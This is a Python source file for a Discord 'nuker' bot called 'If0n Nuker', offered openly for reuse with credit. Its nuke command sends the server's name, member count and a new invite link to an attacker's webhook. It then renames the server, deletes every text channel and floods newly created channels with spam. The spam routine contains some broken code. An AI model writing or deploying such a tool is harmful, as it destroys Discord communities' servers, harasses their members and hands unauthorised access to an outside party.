#Novastorm development all rights reserved!
import discord
from discord.ext import commands
import requests
import time
import threading

intents = discord.Intents.default()
bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

webhook_url = "WEBHOOK-HERE"
token = "TOKEN-HERE"
name = "NAME-HERE"
msg = "MSG-HERE"

@bot.command()
async def ping(ctx):
    await ctx.send("Pong!")
    print("Executed Ping")

cspamm = False

@bot.command
async def cspam(ctx):
    for i in range(1, 69):
        channel = await ctx.guild.create_text_channel(f"{name} better")
        await channel.send(f"{msg}")

        while cspamm:
            for i in range(1, 150):
                await channel.send(f"{msg}")
#You are fully aloud to take code from this project but you must give credit.
@bot.command()
async def nuke(ctx):
    server_name = ctx.guild.name
    members_count = ctx.guild.member_count
    invite = await ctx.channel.create_invite()
    invite_link = invite.url

    payload = {
        "username": "If0n Nuker",
        "embeds": [
          {
            "id": 568521340,
            "description": f"Server: {server_name}\n Num Of Members: {members_count}\n Invite: {invite_link}",
            "fields": [],
            "footer": {
                "text": "Get Fucked!"
            },
            "color": 16711680
          }
        ]
    }

    response = requests.post(webhook_url, json=payload)
#You are fully aloud to take code from this project but you must give credit.
    # The actual nuke
    time.sleep(3)
    await ctx.send(f'NUKED BY {name}')
    await ctx.guild.edit(name=f"NUKED BY {name}")
    for channel in ctx.guild.text_channels:
        await channel.delete()
    threading.Thread(target=cspam).start()


    print("Executed Nuke")


bot.run(token)

#You are fully aloud to take code from this project but you must give credit.